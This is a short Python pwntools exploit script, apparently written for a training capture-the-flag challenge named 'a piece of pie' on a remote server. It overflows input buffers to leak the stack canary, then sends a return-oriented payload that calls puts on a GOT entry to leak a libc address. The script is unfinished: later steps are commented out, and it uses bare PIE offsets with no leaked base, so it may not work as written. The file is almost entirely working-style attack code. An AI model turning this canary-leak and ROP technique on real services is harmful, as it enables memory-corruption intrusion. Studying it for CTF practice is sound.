from pwn import *

port =  21807
rem = remote("srv1.kitriwhs.kr", port)


# rem = process(["./a piece of pie"])
# rem.interactive()

puts_offset = 0x80e50
puts_plt = 0x10b0
puts_got = 0x3fa0

# elf = ELF('./WHS/a piece of pie/problem/a_piece_of_pie')
# base_to_gadget = elf.symbols["gadget"]

gadget = 0x126e

# libc = ELF('./WHS/a piece of pie/problem/libc.so.6')

payload = b"A" * 0x1
rem.sendafter(b"name: ", payload)

payload = b"A" * 0xa9
rem.sendafter(b"1: ", payload)
rem.recvuntil(payload)
recv = rem.recvline().rstrip()
canary = p64(int(recv[0:7].hex(), 16))
print(canary)

payload = b"A" * 0xa8 + canary + b"B" * 0x8 + p64(gadget) +p64(puts_got) + p64(puts_plt)
rem.sendafter(b"2: ", payload)
print(rem.recvline())
# print(rem.recvline().hex()[-14 : -2])
# rem.sendlineafter(b"3: ", payload)
